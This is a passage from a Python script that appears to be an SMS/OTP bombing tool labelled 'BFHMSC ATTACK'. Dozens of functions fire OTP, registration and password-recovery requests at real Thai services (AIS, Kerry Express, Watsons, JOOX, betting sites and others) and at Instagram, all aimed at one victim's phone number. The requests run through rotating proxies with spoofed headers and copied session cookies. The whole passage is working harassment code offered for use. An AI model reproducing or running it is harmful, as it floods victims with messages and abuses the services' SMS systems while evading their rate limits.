	ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"}).text
	r = session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API AIS STATUS API {r}")))

def bfhmscapi32(phone):
	r = requests.post("https://www.tgfone.com/signin/verifylforgot",headers={"user-agent": generate_user_agent(),"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","cookie": "_gcl_au=1.1.491392800.1657955935;_gid=GA1.2.1244336456.1657955937;_fbp=fb.1.1657955937500.30844796;G_ENABLED_IDPS=google;PHPSESSID=d42c517cc5234d40c44310c39e2212d464e2b18a;_ga_1QLSWVZFZ2=GS1.1.1657955937.1.1.1657956238.0;_ga=GA1.2.160165897.1657955937;_gat_gtag_UA_163796127_1=1"},data=f"forgot_name={phone}",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API TGFONE STATUS API {r}")))

def bfhmscapi33(phone):
	r = requests.post('https://api.1112delivery.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=header,proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API 1112 STATUS API {r}")))

def bfhmscapi34(phone):
	r = requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json,proxies={'http': 'http://' + random.choice(s)}
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API FB STATUS API {r}")))

def bfhmscapi35(phone):
	r = requests.post("https://www.mtsblockchain.com/mgb-api/user/register/reqotp",json={"mobile": phone},headers={"Content-Type":"application/json","Cookie":"_ga=GA1.2.1476569446.1657959172; _gid=GA1.2.587325211.1657959172; _gat_gtag_UA_230676474_1=1; connect.sid=s%3Avu1rVQbmGkMrSzQS7GYQ-y4VHMxHdmH7.zuhlp%2BBtukL2ksityudE9OTqdUH5G3dk3XHm3zNEHIs; cookie_policy_accepted=1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API MTBLOCK STATUS API {r}")))

def bfhmscapi36(phone):
	r = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API OCS STATUS API {r}")))

def bfhmscapi37(phone):
	r = requests.post("https://trainflix-api.xeersoft.co.th/api/otpphone/register",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Accept": "application/json, text/plain, */*","Content-Type": "application/json"},json={"numberphone": phone},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API TRAINFLIX STATUS API {r}")))

def bfhmscapi38(phone):
	r = requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API JOOX STATUS API {r}")))

def bfhmscapi39(phone):
	r = requests.post("https://chobrod.com/register",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","x-requested-with": "XMLHttpRequest","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","cookie": ".AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8AbF96Heci1NnsIpfhXCcZq_1dcnjr3wJH7IbyuvXx7JO98q0olmE5QQ09sRX3ts4f0snXBgp8hKG68ehlSJxRKG2BLY2Wj9z-AV6rmiU8RDNlEhHozm-R_ZGKSEbQSycbX455ffFuyBSw7fAUE-9M8; CHOBROD_SERVERID=051_30886; referrerCheckingGA=https://www.google.com/; _ga=GA1.2.684081299.1664700698; _gid=GA1.2.1610639645.1664700698; _gat_UA-88971742-1=1; sidchobrod=m08SOd7CyVuruAdw6iJ6fiZ9Sdm1V90G; usidchobrod=EENsATLoK7OnvSeYvnOuhOEJfl2zllCK; G_ENABLED_IDPS=google; _fbp=fb.1.1664700699743.423276722; GuildId=615af95c-99ca-48ba-bf8c-39a6638a708e; _ga_D11BPJ59QV=GS1.1.1664700697.1.1.1664700735.0.0.0"},data=f"ReturnUrl=%2F&UserName={phone}&Displayname=asssdad+sadass&CityId=1&&Captcha=F9UR",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API CHOBROD STATUS API {r}")))

def bfhmscapi40(phone):
	r = requests.post("https://ep789bet.net/auth/send_otp",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","user-agent": "ep789bet=g9b6cbooof7sq9tmmdtside6s1topdus;__cf_bm=N34Ldd3PZGzyar210NA3MW6tlk6DVyL7TRWX9siAsXk-1657612222-0-AchySBWuKW05LLldbYqjOGsQ9fG8ijO20enZMUqVHANUif9L3qqazpIcC5nC+tUMIfCoSH575g2k16EyMHk43KcE5tZmJTd+lHogz8Rpd3lKbU3eUD1RsrUmgeJwbddVBQ=="},data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API EP789BET STATUS API {r}")))

def bfhmscapi41(phone):
	r = requests.post("https://www.tgfone.com/signin/verifylforgot",headers={"user-agent": generate_user_agent(),"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","cookie": "_gcl_au=1.1.491392800.1657955935;_gid=GA1.2.1244336456.1657955937;_fbp=fb.1.1657955937500.30844796;G_ENABLED_IDPS=google;PHPSESSID=d42c517cc5234d40c44310c39e2212d464e2b18a;_ga_1QLSWVZFZ2=GS1.1.1657955937.1.1.1657956238.0;_ga=GA1.2.160165897.1657955937;_gat_gtag_UA_163796127_1=1"},data=f"forgot_name={phone}",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API TGFONE STATUS API {r}")))

def bfhmscapi42(phone):
	r = requests.post("https://www.jdbaa.com/api/otp-not-captcha",headers={"content-type": "application/json; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_ga=GA1.2.139524076.1653888756;_hjSessionUser_1879787=eyJpZCI6IjczNjVhMTYxLTFkNzktNWVjYS04N2M4LTc3ZTk3ODUyY2U3ZiIsImNyZWF0ZWQiOjE2NTM4ODg3NTc4ODksImV4aXN0aW5nIjp0cnVlfQ==;_fw_crm_v=b55243cc-06b2-4f25-ca32-2a7634301a95;connect.sid=s%3AiV4V1-65FA5rpJyEObOITUh2fyDcYhen.aclXEUqD4Qe5nlUYVG0mb1zIAC4OuxP4FWCX6%2B8E9WU;io=c7ilAXG_QnIDDz0xAKH5;countdown_lotto_th=345759;_gid=GA1.2.626569110.1657612643;_gat_gtag_UA_139533742_1=1;_hjIncludedInSessionSample=0;_hjSession_1879787=eyJpZCI6ImVjMzQ5NWNiLTIwOGQtNGViYS1hNmY3LTY2ZDVhM2JhMGNmZCIsImNyZWF0ZWQiOjE2NTc2MTI2NDUyMzEsImluU2FtcGxlIjpmYWxzZX0=;_hjAbsoluteSessionInProgress=0;modal_htd=true;_fw_crm_v=b55243cc-06b2-4f25-ca32-2a7634301a95"},json={"phone_number":phone,"user_id":f"ak{phone}"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API JDBAA STATUS API {r}")))

def bfhmscapi43(phone):
	r = requests.get(f"https://app.iship.cloud/api/ant/request-otp/{phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "_fbp=fb.1.1664699330289.47112595; XSRF-TOKEN=eyJpdiI6Ijk3cVRMUndzZ2FUME8wV2VzRXFaWWc9PSIsInZhbHVlIjoiQjRkNzlNYXR2TWtSWmNySlFYVjBoQk80RGJMR215RXVFUjRuMTFNYm5ocGRDRmNGcHNjWmpOeUdnOWlPbmFhVXA5eG1LUlB2SVZEMjRFWEVITTRZV1hzZUtZenArenZjK0R3UE5OTUdTQkVWUG1tYmkrTG1NWWFiTUZOZ1NRMlIiLCJtYWMiOiI3Y2M1OGJkMzg2MzZkZDYwNjlmNjNkMmFkYWZlZDVkNjliZGJjMjUwN2MyMjJmYzgxODE3ZGYxOWY1NWU4MzhlIiwidGFnIjoiIn0%3D; iship_session=eyJpdiI6IjdueEZQTU5Kc0FXZ0hjeVF0L2s2WVE9PSIsInZhbHVlIjoidHNzZ1RINDhta1BnUkFic29hdFlMNU8zVWt0MGZYbUVMb1Q0ZjM0OVR5cFlSbE01NlNuMWRoeGF4SldiVHN3U3JFZWg5dnJvMEZHbnF6cnlNdG45SmZjSGxqRkNRN0w0T3oyclBHc09ZM2svd3VZZkl4TG9NRHFLMTIxeGhvd2oiLCJtYWMiOiJhMTBjZThjNGU5M2Y0NjM1MTQ4ZTI4MGFmMzkxMmQ4ZmY0NjljNGM5YjBkZWZkMGIxYTM5Y2Y5MDgyNWZkOTk1IiwidGFnIjoiIn0%3D; _gcl_au=1.1.1744992984.1664699333; _ga_5H8RG35JM3=GS1.1.1664699330.1.1.1664699332.0.0.0; _gid=GA1.2.1851918371.1664699333; _gat_UA-208577766-1=1; _ga=GA1.1.1543229521.1664699330; _ga_9QF6J7SNMX=GS1.1.1664699332.1.0.1664699332.0.0.0"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API ISHIP STATUS API {r}")))

def bfhmscapi44(phone):
	r = requests.get("https://www.baanandbeyond.com/registration_initiate?on%5Bcountry%5D=66&on%5Bvalue%5D="+phone+"&type=mobile",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API BAANAND STATUS API {r}")))

def bfhmscapi45(phone):
	r = requests.post("https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/"+phone,proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API KERRY STATUS API {r}")))

def bfhmscapi46(phone):
	r = post("https://www.vegas77slots.com/auth/send_otp",data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",headers={"content-type": "application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API VEGAS STATUS API {r}")))

def bfhmscapi47(phone):
	r = requests.get(f"https://4k6hzpuupa.execute-api.ap-southeast-1.amazonaws.com/dev/request-otp/+66{phone[1:]}",headers={"authority": "4k6hzpuupa.execute-api.ap-southeast-1.amazonaws.com","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API 4K6HZ STATUS API {r}")))

def bfhmscapi48(phone):
	r = requests.post("https://kaspy.com/sms_63Vswc5dWk/sms.php/",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Cookie": "PHPSESSID=mvqfmd1daih60ep28gj9nrn04s; __atssc=google%3B1; __atuvc=2%7C42; __atuvs=634df68d89321b08001; private_content_version=93eb667db1caa66571dcb26591913a1e; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; form_key=fSk22U7uobzfYUUe; section_data_ids=%7B%22cart%22%3A1666053825%2C%22messages%22%3A1666053825%2C%22customer%22%3A1666053825%2C%22compare-products%22%3A1666053825%2C%22last-ordered-items%22%3A1666053825%2C%22directory-data%22%3A1666053825%2C%22captcha%22%3A1666053825%2C%22instant-purchase%22%3A1666053825%2C%22persistent%22%3A1666053825%2C%22review%22%3A1666053825%2C%22wishlist%22%3A1666053825%2C%22chatData%22%3A1666053816%2C%22recently_viewed_product%22%3A1666053825%2C%22recently_compared_product%22%3A1666053825%2C%22product_data_storage%22%3A1666053825%2C%22paypal-billing-agreement%22%3A1666053825%7D; _ga=GA1.2.1819946247.1666053827; _gid=GA1.2.2014825757.1666053827; _gat=1; mage-messages="},data=f"phoneVerifyFromSites={phone}",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API KASPY STATUS API {r}")))

def bfhmscapi49(phone):
	r = requests.post("https://api.best-inc.co.th/account/sendlogincode",headers={"content-type": "application/x-www-form-urlencoded","authorization": "Bearer null","user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"},data=f"phoneNumber=%22{phone}%22",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API INC STATUS API {r}")))

def bfhmscapi50(phone):
	r = requests.post("https://api.watsons.co.th/api/v2/wtcth/forms/combinedRegistrationForm/steps/wtcth_combinedRegistrationForm_step1/validateAndPrepareNextStep?fields=ASIA_DEFAULT&lang=th&curr=THB",headers={"user-agent": generate_user_agent(),"authorization":"bearer KDT4GwC7WLHdgLurm3ChB_vvvBE"},json={"otpTokenRequest":{"action":"REGISTRATION","type":"SMS","countryCode":"66","target":phone},"defaultAddress":{"mobileNumberCountryCode":"66","mobileNumber":phone},"mobileNumber":phone},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API WATSONS STATUS API {r}")))

def bfhmscapi51(phone):
	r = requests.post("https://ep789bet.net/auth/send_otp",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","user-agent": "ep789bet=g9b6cbooof7sq9tmmdtside6s1topdus;__cf_bm=N34Ldd3PZGzyar210NA3MW6tlk6DVyL7TRWX9siAsXk-1657612222-0-AchySBWuKW05LLldbYqjOGsQ9fG8ijO20enZMUqVHANUif9L3qqazpIcC5nC+tUMIfCoSH575g2k16EyMHk43KcE5tZmJTd+lHogz8Rpd3lKbU3eUD1RsrUmgeJwbddVBQ=="},data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API EP789BET STATUS API {r}")))

def bfhmscapi52(phone):
	r = requests.post("https://api.monkeyeveryday.com/graphql",headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36","content-type": "application/json"},json={"operationName":"requestRegistrationOtp","variables":{"phone":phone},"query":"mutation requestRegistrationOtp($phone: String!) {\n  requestRegistrationOtp(phone: $phone) {\n    token\n    __typename\n  }\n}\n"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API MONKEY STATUS API {r}")))

def bfhmscapi53(phone):
	r = requests.post("https://www.easymoney.co.th/estimate/actionSendOtp",data=f"gg_token&name=cybersafe&surname=cybersafe&email=rjrockyou@gmail.com&phone={phone}&area_id=2&password=Hack80&password_chk=Hack80&code=&condition=1",headers={"accept":"application/json, text/javascript, */*; q=0.01","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36","cookie":"PHPSESSID=1933025720c12fcbb618a207ad775e54;_gcl_au=1.1.506859633.1650848781;_fbp=fb.2.1650848782133.743024538;_ga=GA1.3.1379383593.1650848782;pdpa=1;_gid=GA1.3.380431543.1651807350;_gat_UA-182229042-1=1"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API EASYMONEY STATUS API {r}")))

def bfhmscapi54(phone):
	r = requests.post("https://shopgenix.com/api/sms/otp/", headers={
            "Host": "shopgenix.com",
            "content-length": "37",
            "sec-ch-ua-mobile": "?1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-requested-with": "XMLHttpRequest",
            "sec-ch-ua-platform": "Android",
            "accept": "application/json, text/javascript, /; q=0.01",
            "origin": "https://shopgenix.com",
            "referer": "https://shopgenix.com/app/5364874/",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty"
            }, data=f"mobile_country_id=1&mobile={phone}",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API SHOPGENIX STATUS API {r}")))

def bfhmscapi55(phone):
	r = requests.post("https://api.watsons.co.th/api/v2/wtcth/forms/extendedActivateMemberCardForm/steps/wtcth_extendedActivateMemberCardForm_step1/validateAndPrepareNextStep?fields=ASIA_DEFAULT&lang=th&curr=THB",proxies ={"http" : "http://" + random.choice(proxy)},headers={
    "content-type": "application/json",
"x-anonymous-consents": "%5B%5D",
"accept": "application/json, text/plain, /",
"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"queueit-target": "https://www.watsons.co.th/register/activateMemberCard",
"sec-ch-ua-platform": "Android",
"origin": "https://www.watsons.co.th",
"referer": "https://www.watsons.co.th/"
    },
    json={"otpTokenRequest":{"action":"ACTIVATE_MEMBER_CARD","type":"SMS","countryCode":"66","target":f"{phone}"},"defaultAddress":{"mobileNumberCountryCode":"66","mobileNumber":f"{phone}"},"mobileNumber":f"{phone}"})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API WATSONS STATUS API {r}")))

def bfhmscapi56(phone):
	r = post("https://api.watsons.co.th/api/v2/wtcth/forms/extendedActivateMemberCardForm/steps/wtcth_extendedActivateMemberCardForm_step1/validateAndPrepareNextStep?fields=ASIA_DEFAULT&lang=th&curr=THB",
proxies ={"http" : "http://" + random.choice(proxy)},headers={
	"content-type": "application/json",
"x-anonymous-consents": "%5B%5D",
"accept": "application/json, text/plain, */*",
"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"queueit-target": "https://www.watsons.co.th/register/activateMemberCard",
"sec-ch-ua-platform": "Android",
"origin": "https://www.watsons.co.th",
"referer": "https://www.watsons.co.th/"
	},
	json={"otpTokenRequest":{"action":"ACTIVATE_MEMBER_CARD","type":"SMS","countryCode":"66","target":f"{phone}"},"defaultAddress":{"mobileNumberCountryCode":"66","mobileNumber":f"{phone}"},"mobileNumber":f"{phone}"})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API WATSONSV2 STATUS API {r}")))

def bfhmscapi57(phone):
	r = requests.post("https://pgbetflik.com/account/register/sendotp",data=f"phone={phone}",headers={"content-type: application/x-www-form-urlencoded; charset=UTF-8","requested-with: XMLHttpRequest","user-agent: Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API PGBET STATUS API {r}")))

def bfhmscapi58(phone):
	r = requests.post("https://graph.firster.com/graphql",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type": "application/json"},json={"operationName":"sendOtp","variables":{"input":{"mobileNumber":f"{phone[1:]}","phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API FIRSTER STATUS API {r}")))

def bfhmscapi59(phone):
	r = post("https://ezregis01.com/_ajax_/register/request-otp", json={"phoneNumber":f"{phone}","affSign":"e1af462f54b57749cb61e4ac010fd0ee"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API EZ STATUS API {r}")))

def bfhmscapi60(phone):
	r = requests.post("https://api-sso.ch3plus.com/user/request-otp", json={"tel":f"{phone}","type":"login"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API 3PLUSV2 STATUS API {r}")))

def bfhmscapi61(phone):
	r = post("https://www.beauticool.com/?m=request_otp",headers={
"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
"x-requested-with": "XMLHttpRequest",
"sec-ch-ua-mobile": "?1",
"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"sec-ch-ua-platform": "Android",
"origin": "https://www.beauticool.com",
"referer": "https://www.beauticool.com/m/signup_tel.php",
"cookie": "PHPSESSID=udogc4sigrtvi4lvkll4g62gp3",
"cookie": "_ga=GA1.1.1703943258.1663615884",
"cookie": "trustedsite_visit=1",
"cookie": "_ga_PZZ327LRJ2=GS1.1.1663615884.1.1.1663615918.0.0.0"
    },data=f"tel={phone}",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API BEAUTICOOLV2 STATUS API {r}")))

def bfhmscapi62(phone):
	r = post("https://aff.ufaclub24.org/pin.php",headers={
                "origin": "https://aff.ufaclub24.org",
                 "content-type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "referer": "https://aff.ufaclub24.org/phoneregis.php?invitekey=41bfd20a38bb1b0bec75acf0845530a7",
                "cookie": "PHPSESSID=n6da80gl0j6u7ob1ltlseb5m6p;_ga=GA1.2.18658305.1649308092;_gid=GA1.2.1210153607.1649308092;_gat_gtag_UA_155192447_2=1"
                },data=f"invitekey=41bfd20a38bb1b0bec75acf0845530a7&txtTel={phone}",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API UFA STATUS API {r}")))

def bfhmscapi63(phone):
	r = requests.post("https://api-sso.ch3plus.com/user/request-otp", json={"tel":f"{phone}","type":"login"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API 3PLUSV2 STATUS API {r}")))

def bfhmscapi64(phone):
	r = ru.post("https://www.tgfone.com/signin/otp_chk_fast",
	headers= {
                "accept": "text/html, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                "origin": "https://www.tgfone.com",
                "referer": "https://www.tgfone.com/login"
                },data=f"mobile={phone}&type_otp=7",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API TGFONEV2 STATUS API {r}")))

def bfhmscapi65(phone):
	r = post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0},proxies ={"http" : "http://" + random.choice(proxy)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API CARSOME STATUS API {r}")))

def bfhmscapi66(phone):
	r = post("https://www.kaitorasap.co.th/api/index.php/send-otp-login-new/",headers={
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
"X-Requested-With": "XMLHttpRequest",
"sec-ch-ua-mobile": "?1",
"User-Agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"},data=f"phone_number={phone}&lag=",proxies={'http': 'http://' + random.choice(s)})
